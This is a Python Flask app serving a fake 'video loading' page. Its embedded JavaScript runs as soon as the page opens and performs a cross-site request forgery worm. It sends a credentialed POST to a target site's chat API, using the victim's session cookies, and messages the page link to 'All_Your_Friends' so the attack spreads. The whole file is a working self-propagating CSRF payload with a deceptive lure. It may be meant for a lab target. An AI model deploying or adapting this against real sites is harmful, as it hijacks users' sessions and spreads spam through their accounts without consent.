from flask import Flask, render_template_string

app = Flask(__name__)

@app.route('/')
def index():
    # This HTML contains the 'Worm' script
    return render_template_string('''
        <!DOCTYPE html>
        <html>
        <head><title>Loading Video...</title></head>
        <body>
            <h1>404 - Video Not Found</h1>
            <p>The video is loading, please wait...</p>

            <script>
                async function spreadWorm() {
                    // REPLACE THIS with your actual Target Render URL
                    const TARGET_URL = 'https://csrf-target-2.onrender.com/';
                    
                    try {
                        await fetch(`${TARGET_URL}/api/send_chat`, {
                            method: 'POST',
                            mode: 'cors',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                to: "All_Your_Friends",
                                msg: "Check out this video: " + window.location.href
                            }),
                            // This is the most important line: it tells the browser to send the Facebook cookie
                            credentials: 'include' 
                        });
                        console.log("Worm sent successfully in the background.");
                    } catch (err) {
                        console.error("Worm blocked or failed.");
                    }
                }

                // Run the attack immediately when the page opens
                spreadWorm();
            </script>
        </body>
        </html>
    ''')

if __name__ == "__main__":
    app.run()
